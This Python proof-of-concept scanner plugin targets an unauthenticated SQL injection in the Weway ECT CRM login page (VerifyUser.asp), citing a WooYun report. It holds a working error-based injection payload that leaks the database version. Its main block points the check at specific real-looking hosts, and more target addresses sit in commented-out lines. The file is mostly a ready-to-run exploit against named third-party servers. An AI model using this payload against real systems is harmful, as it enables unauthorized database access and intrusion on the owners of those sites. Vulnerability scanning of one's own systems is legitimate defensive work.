#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : 任我行ECT存在SQL注入(无需登录) 
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0105065
"""
def assign(service, arg): 
    if service == "weway_soft": 
        return True, arg 
def audit(arg):
    payload ="VerifyUser.asp"
    data="LoginName=admin'%20AND%204996=CONVERT(INT,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version))%20AND%20'kmly'='kmly&Password=admin&Validatepwds=&LockNum=err&UserRank=0"
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target,data)
    #print res
    if code!=0 and 'GAO JI@Microsoft SQL Server' in res: 
        security_hole(target) 
if __name__ == '__main__': 
    from dummy import *
    audit(assign('weway_soft','http://120.31.62.218/')[1])
    audit(assign('weway_soft','http://crm.netzone.com/')[1])
    # audit(assign('rcm_oa','http://121.9.201.153/')[1])
    # audit(assign('rcm_oa','http://221.10.14.66/zhang/')[1])
    # audit(assign('rcm_oa','http://61.184.240.105/crm/')[1])
    # audit(assign('rcm_oa','http://crm.kx8.cn/')[1])
    # audit(assign('rcm_oa','http://tianzhengtaisheng.3322.org/crm/')[1])
    # audit(assign('rcm_oa','http://crm.techray.com.cn/')[1])